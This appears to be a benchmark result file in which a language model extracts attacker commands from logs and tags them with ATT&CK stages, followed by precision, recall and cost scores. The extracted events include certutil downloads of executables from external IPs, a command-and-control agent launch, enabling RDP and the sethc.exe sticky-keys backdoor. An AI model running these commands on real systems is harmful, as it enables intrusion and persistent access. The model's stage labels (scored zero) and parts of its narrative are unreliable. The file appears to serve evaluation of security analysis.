@@ -1,0 +1,110 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Persistence"
+      },
+      {
+        "command": "start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "del /f /q PhpStudyPoc.py",
+        "stage": "Collection"
+      },
+      {
+        "command": "del /f /q PhpStudyExp2.py",
+        "stage": "Collection"
+      },
+      {
+        "command": "del /f /q WinBrute.exe",
+        "stage": "Collection"
+      },
+      {
+        "command": "del /f /q nbtscan.exe",
+        "stage": "Collection"
+      },
+      {
+        "command": "del /f /q PAExec.exe",
+        "stage": "Collection"
+      },
+      {
+        "command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d C:\\windows\\system32\\cmd.exe /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \\\"C:\\windows\\system32\\sethc.exe\\\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg query \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://111.229.170.12/phpmyadmin/themes/servert.exe C:\\Windows\\ywm.exe",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "del /f /q nbtscan.exe",
+        "stage": "Lateral Movement"
+      }
+    ],
+    "narrative": "The attackers started by downloading an executable using `certutil` on port 8079, indicating a persistence mechanism through web-based tools. This was followed by starting another executable called `Agent.exe` via a relative path, suggesting a connection back to the attacker-controlled server at IP address `124.223.85.207`. The attackers also deleted several files belonging to their own malware, likely due to cleanup operations. Furthermore, they attempted to disable the Terminal Services configuration key to enable RDP access and modified the registry entry for sethc.exe to point to cmd.exe, allowing them to elevate privileges when pressing Shift + F5. They executed various commands to gather information such as CPU info, memory usage, and running processes. Finally, they created new users named 'oop' and added them to certain groups.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 67625,
+      "completion_tokens": 2275,
+      "total_tokens": 69900,
+      "wall_clock_s": 13.336,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.6,
+      "recall": 0.8181818181818182,
+      "f1": 0.6923076923076923,
+      "tp": 9,
+      "fp": 6,
+      "fn": 2
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 15,
+      "fn": 6,
+      "recall_partial": 0.3333333333333333
+    },
+    "hallucination_rate": 0.07142857142857142,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 67625,
+      "completion_tokens": 2275,
+      "total_tokens": 69900,
+      "wall_clock_s": 13.336,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v2_maxtok4096",
+    "max_tokens": 4096,
+    "prompt_variant": "base",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
